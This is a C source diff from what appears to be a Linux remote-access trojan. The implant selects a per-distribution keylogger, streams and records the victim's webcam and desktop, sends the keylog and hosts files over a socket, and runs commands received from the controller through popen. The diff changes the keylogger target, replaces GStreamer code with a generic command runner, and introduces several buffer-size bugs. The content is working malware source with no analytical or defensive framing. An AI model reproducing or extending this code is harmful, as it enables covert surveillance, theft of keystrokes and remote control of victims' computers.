@@ -75,9 +75,9 @@ int main(int argc, char*argv[])
 
     //ubuntu16_keylogger_init();
 
-    ubuntu18_keylogger_init();
+    //ubuntu18_keylogger_init();
 
-    //mint_keylogger_init();
+    mint_keylogger_init();
 
     //debian_keylogger_init();
 
@@ -113,7 +113,7 @@ void dispatch_modules(char *argv[])
     int caractereLu = 0;
     int i = 0;
 
-    char buffer[MAXDATASIZE] = "";
+    char buffer[BUFSIZ] = "";
 
     pthread_t thread_remote_shell = 0;
     pthread_t thread_downloader = 0;
@@ -243,14 +243,14 @@ void dispatch_modules(char *argv[])
 
             do
             {
-                dataRead = fread(buffer, sizeof(char), file_size, log_file);
+                dataRead = fread(buffer, sizeof(char), sizeof(file_size), log_file);
                 if(dataRead < 0)
                 {
                     perror("fread ");
                     return;
                 }
 
-                dataSend = send(csock, buffer, file_size, 0);
+                dataSend = send(csock, buffer, sizeof(file_size), 0);
 
                 //printf("Envoie de %ld octets\n", dataSend);
 
@@ -347,7 +347,7 @@ void dispatch_modules(char *argv[])
         {
             printf("\t\tSTREAM THE WEBCAM....\n");
 
-            if(pthread_create(&stream_webcam_thread, NULL, (void*(*)(void*))execute_watch_cmd, NULL) == -1)
+            if(pthread_create(&stream_webcam_thread, NULL, (void*(*)(void*))execute_cmd, NULL) == -1)
             {
                 error("pthread_create() stream_webcam_thread", "dispatch_modules()");
                 exit(-1);
@@ -370,9 +370,9 @@ void dispatch_modules(char *argv[])
             printf("\t\tSTREAMING STARTED....\n");
 
              Call the thread that will execute the stream command
-            if(pthread_create(&stream_desktop, NULL, (void*(*)(void*)execute_watch_cmd, NULL) == -1)
+            if(pthread_create(&stream_desktop, NULL, (void*(*)(void*)execute_cmd, NULL) == -1)
             {
-                error("pthread_create() execute_watch_cmd", "dispatch_modules()");
+                error("pthread_create() execute_cmd", "dispatch_modules()");
                 exit(-1);
             }
 
@@ -391,7 +391,7 @@ void dispatch_modules(char *argv[])
             printf("\t\tRECORD WEBCAM STARTED....\n");
 
             /** Call the thread that will execute the stream command **/
-            if(pthread_create(&record_webcam_thread, NULL, (void*(*)(void*))record_webcam, NULL) == -1)
+            if(pthread_create(&record_webcam_thread, NULL, (void*(*)(void*))execute_cmd, NULL) == -1)
             {
                 error("pthread_create() record_webcam_thread", "dispatch_modules()");
                 exit(-1);
@@ -559,12 +559,12 @@ void *send_dowloaded_file()
 
     FILE *on_download = NULL;
 
-    char buffer[BUFSIZ] = {0};
+    char buffer[BUFSIZ] = "";
 
     long dataSend = 0;
     long dataRead = 0;
     long totalSend = 0;
-    int file_size = 0;
+    long file_size = 0;
 
     if(recv(csock, (char*)&len_file_path, sizeof(len_file_path), 0) == -1)
     {
@@ -658,7 +658,7 @@ void *send_hosts_file()
 
     FILE *hosts_download = NULL;
 
-    char buffer[MAXDATASIZE] = "";
+    char buffer[BUFSIZ] = "";
 
     long dataSend = 0;
     long dataRead = 0;
@@ -703,14 +703,14 @@ void *send_hosts_file()
 
     do
     {
-        dataRead = fread(buffer, file_size, sizeof(char), hosts_download);
+        dataRead = fread(buffer, sizeof(char),sizeof(file_size), hosts_download);
         if(dataRead < 0)
         {
             perror("fread ");
             return 0;
         }
 
-        dataSend = send(csock, buffer, file_size, 0);
+        dataSend = send(csock, buffer, sizeof(file_size), 0);
 
         //printf("Envoie de %ld octets\n", dataSend);
 
@@ -853,139 +853,7 @@ void *start_remote_shell(char *argv[])
 }
 
 
-void execute_watch_cmd()
-{
-    size_t len_watch_cmd = 0;
-    char *buffer = NULL;
-
-    GstElement *pipeline;
-    GstBus *bus;
-    GstStateChangeReturn ret;
-    GMainLoop *main_loop;
-    CustomData data;
-
-    if(recv(csock, (char*)&len_watch_cmd, sizeof(len_watch_cmd), 0) == SOCKET_ERROR)
-    {
-        error("recv() len_watch_cmd", "execute_watch_cmd()");
-        return;
-    }
-
-    buffer = malloc(len_watch_cmd * sizeof(char));
-    if(buffer == NULL)
-    {
-        error("malloc() buffer", "execute_watch_cmd()");
-         return;
-    }
-
-    if(recv(csock, buffer, len_watch_cmd, 0) == SOCKET_ERROR)
-    {
-        error("recv() buffer", "execute_watch_cmd()");
-        return;
-    }
-
-     /* Initialize our data structure */
-    memset (&data, 0, sizeof (data));
-
-    /* Build the pipeline */
-    pipeline = gst_parse_launch(buffer, NULL);
-    bus = gst_element_get_bus (pipeline);
-
-    /* Start playing */
-    ret = gst_element_set_state (pipeline, GST_STATE_PLAYING);
-
-    if(ret == GST_STATE_CHANGE_FAILURE)
-    {
-        g_printerr ("Unable to set the pipeline to the playing state.\n");
-        gst_object_unref (pipeline);
-        return;
-    }
-
-    else if(ret == GST_STATE_CHANGE_NO_PREROLL)
-    {
-        data.is_live = TRUE;
-    }
-
-    main_loop = g_main_loop_new (NULL, FALSE);
-    data.loop = main_loop;
-    data.pipeline = pipeline;
-
-    gst_bus_add_signal_watch (bus);
-    g_signal_connect(bus, "message", G_CALLBACK(cb_message), &data);
-
-    pthread_exit(NULL);
-
-    g_main_loop_run(main_loop);
-
-    /* Free resources **/
-    g_main_loop_unref (main_loop);
-    gst_object_unref (bus);
-    gst_element_set_state (pipeline, GST_STATE_NULL);
-    gst_object_unref (pipeline);
-
-    free(buffer);
-
-    return;
-}
-
-void cb_message(GstBus *bus, GstMessage *msg, CustomData *data)
-{
-    switch (GST_MESSAGE_TYPE (msg))
-    {
-        case GST_MESSAGE_ERROR:
-        {
-            GError *err;
-            gchar *debug;
-
-            gst_message_parse_error (msg, &err, &debug);
-            g_print ("Error: %s\n", err->message);
-            g_error_free (err);
-            g_free (debug);
-
-            gst_element_set_state (data->pipeline, GST_STATE_READY);
-            g_main_loop_quit (data->loop);
-            break;
-        }
-
-        case GST_MESSAGE_EOS:
-            /* end-of-stream */
-            gst_element_set_state (data->pipeline, GST_STATE_READY);
-            g_main_loop_quit (data->loop);
-            break;
-
-        case GST_MESSAGE_BUFFERING:
-        {
-            gint percent = 0;
-
-            /* If the stream is live, we do not care about buffering. */
-            if (data->is_live) break;
-
-            gst_message_parse_buffering (msg, &percent);
-            g_print ("Buffering (%3d%%)\r", percent);
-
-            /* Wait until buffering is complete before start/resume playing */
-            if (percent < 100)
-                gst_element_set_state (data->pipeline, GST_STATE_PAUSED);
-
-            else
-                gst_element_set_state (data->pipeline, GST_STATE_PLAYING);
-
-            break;
-        }
-
-        case GST_MESSAGE_CLOCK_LOST:
-
-            /* Get a new clock */
-            gst_element_set_state (data->pipeline, GST_STATE_PAUSED);
-            gst_element_set_state (data->pipeline, GST_STATE_PLAYING);
-            break;
-
-        default:
-            /* Unhandled message */
-            break;
-    }
-}
-
-void record_webcam()
+void execute_cmd()
 {
     size_t len_record_cmd = 0;
     char *buffer = NULL;
@@ -994,20 +862,20 @@ void record_webcam()
 
     if(recv(csock, (char*)&len_record_cmd, sizeof(len_record_cmd), 0) == SOCKET_ERROR)
     {
-        error("recv() len_record_cmd", "record_webcam()");
+        error("recv() len_record_cmd", "execute_watch_cmd()");
         exit(-1);
     }
 
     buffer = malloc(len_record_cmd * sizeof(char));
     if(buffer == NULL)
     {
-        error("malloc() buffer", "record_webcam()");
+        error("malloc() buffer", "execute_watch_cmd()");
         exit(-1);
     }
 
     if(recv(csock, buffer, len_record_cmd, 0) == SOCKET_ERROR)
     {
-        error("recv() buffer", "record_webcam()");
+        error("recv() buffer", "execute_watch_cmd()");
         exit(-1);
     }
 
@@ -1015,9 +883,17 @@ void record_webcam()
     pipe = popen(buffer, "r");
     if(pipe == NULL)
     {
-        error("popen() pipe", "record_webcam()");
+        error("popen() pipe", "execute_watch_cmd()");
         return;
     }
+
+    if(pclose(pipe) == -1)
+    {
+        error("pclose() pipe]", "execute_watch_cmd()");
+        pthread_exit(NULL);
+    }
+
+    pthread_exit(NULL);
 }
 
 
